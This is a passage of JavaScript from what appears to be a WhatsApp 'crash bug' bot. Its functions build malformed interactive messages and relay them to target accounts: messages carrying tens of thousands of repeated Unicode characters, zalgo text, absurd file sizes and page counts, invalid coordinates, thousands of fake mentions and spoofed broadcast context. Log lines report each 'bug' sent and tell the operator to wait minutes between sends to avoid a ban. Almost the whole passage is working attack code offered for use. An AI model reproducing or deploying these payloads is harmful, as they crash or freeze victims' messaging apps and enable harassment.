̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ Crag̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺  ▾⭑̤",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true
              },
              hasMediaAttachment: true
            },
            body: {
              text: "𝙑𝙞𝙣𝙘𝙚𝙣𝙩 𝙑𝟤𓍯𓂃ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ𓍯̤𖣂  R҉e҉n҉ - U I\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ҉          𖣂𓍯̤\n" + "\n\n\n\n\n\n\n\n\n\n\n\n@6285929014979".repeat(27000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{}"
            },
            contextInfo: {
              mentionedJid: ["6285929014979@s.whatsapp.net"],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: ""
                }
              }
            }
          }
        }
      }
    }, p26 ? {
      participant: {
        jid: p25
      }
    } : {});
    console.log(chalk2.green(" ✧❁۪ ｡˚ ┊Ｕｉ┊ａｔｔａｃｋ┊Ｕｉ┊  ❁۪ ｡˚ ✧"));
  }
  async function f6(p27, p28, p29 = false) {
    let vGenerateWAMessageFromContent2 = generateWAMessageFromContent(p27, proto.Message.fromObject({
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏" + "ꦾ".repeat(77777),
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "AntiGimik",
                address: "AntiGimik"
              },
              hasMediaAttachment: true
            },
            body: {
              text: ""
            },
            nativeFlowMessage: {
              messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
              buttons: [{
                name: "single_select",
                buttonParamsJson: {
                  title: "AntiGimik",
                  sections: [{
                    title: "RennVx",
                    rows: []
                  }]
                }
              }, {
                name: "call_permission_request",
                buttonParamsJson: {}
              }]
            }
          }
        }
      }
    }), {
      userJid: p27,
      quoted: p28
    });
    await p.relayMessage(p27, vGenerateWAMessageFromContent2.message, p29 ? {
      participant: {
        jid: p27
      }
    } : {});
    console.log(chalk2.blue(" *DONE SEND BUG JEDA 3-7 MENIT AGAR TIDAK TERKENA BAND* "));
  }
  ;
  async function f7(p30, p31, p32 = false, p33 = false) {
    let vGenerateWAMessageFromContent3 = generateWAMessageFromContent(p30, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 9007199254740991,
                mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                fileName: "Lawakkk",
                fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1723855952",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE="
              },
              hasMediaAttachment: true
            },
            body: {
              text: "ㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤ⭑̤⟅̊༑ ▾ R҉e҉n҉C҉r҉a҉s҉h҉         ⿻ R҉e҉n҉C҉r҉a҉s҉h҉   g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉       ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
              buttons: [p32 ? {
                name: "single_select",
                buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"AntiGimik ϟ\",\"rows\":[]}]}"
              } : {
                name: "payment_method",
                buttonParamsJson: ""
              }, {
                name: "call_permission_request",
                buttonParamsJson: "{}"
              }, {
                name: "payment_method",
                buttonParamsJson: "{}"
              }, {
                name: "single_select",
                buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"sections\":[{\"title\":\"Crashh ϟ\",\"rows\":[]}]}"
              }, {
                name: "galaxy_message",
                buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
              }, {
                name: "mpm",
                buttonParamsJson: "{}"
              }]
            }
          }
        }
      }
    }), {
      userJid: p30,
      quoted: p31
    });
    await p.relayMessage(p30, vGenerateWAMessageFromContent3.message, p33 ? {
      participant: {
        jid: p30
      }
    } : {});
    console.log(chalk2.green(" *DONE SEND BUG JEDA 3-7 MENIT AGAR TIDAK TERKENA BAND* "));
  }
  ;
  async function f8(p34, p35 = true) {
    let vGenerateWAMessageFromContent4 = generateWAMessageFromContent(p34, proto.Message.fromObject({
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "⭑̤⟅̊༑ ▾ XCVT ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true
              },
              hasMediaAttachment: true
            },
            body: {
              text: "⭑̤⟅̊༑ ▾ R҉e҉n҉C҉r҉a҉s҉h҉         ⿻ R҉e҉n҉C҉r҉a҉s҉h҉         ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "@6285929014979".repeat(17000)
            },
            nativeFlowMessage: {
              buttons: [{
                name: "cta_url",
                buttonParamsJson: "{ display_text: '🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉', url: \"https://youtube.com/PakTzy\", merchant_url: \"https://youtube.com/laxxyoffc\" }"
              }, {
                name: "call_permission_request",
                buttonParamsJson: "{}"
              }],
              messageParamsJson: "{}"
            },
            contextInfo: {
              mentionedJid: ["6285929014979@s.whatsapp.net"],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: ""
                }
              }
            }
          }
        }
      }
    }), {
      userJid: p34
    });
    await p.relayMessage(p34, vGenerateWAMessageFromContent4.message, p35 ? {
      participant: {
        jid: p34
      }
    } : {});
    console.log(chalk2.green(" *DONE SEND BUG JEDA 3-7 MENIT AGAR TIDAK TERKENA BAND* "));
  }
  ;
  async function f9(p36) {
    await p.relayMessage(p36, {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0
              },
              hasMediaAttachment: true
            },
            body: {
              text: "R҉e҉n҉C҉r҉a҉s҉h҉ R҉e҉n҉C҉r҉a҉s҉" + "ꦾ".repeat(60000)
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({
                length: 5
              }, () => "1@newsletter"),
              groupMentions: [{
                groupJid: "1@newsletter",
                groupSubject: "trash"
              }]
            }
          }
        }
      }
    }, {
      participant: {
        jid: p36
      }
    }, {
      messageId: null
    });
  }
  async function f10(p37, p38 = false) {
    await p.relayMessage(p37, {
      extendedTextMessage: {
        text: "`UI XVINCENT`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ꦾ".repeat(55000),
        contextInfo: {
          mentionedJid: ["6285929014979@s.whatsapp.net", ...Array.from({
            length: 15000
          }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")],
          stanzaId: "1234567890ABCDEF",
          participant: "6285929014979@s.whatsapp.net",
          quotedMessage: {
            callLogMesssage: {
              isVideo: false,
              callOutcome: "5",
              durationSecs: "999",
              callType: "REGULAR",
              participants: [{
                jid: "6285929014979@s.whatsapp.net",
                callOutcome: "5"
              }]
            }
          },
          remoteJid: p37,
          conversionSource: " X ",
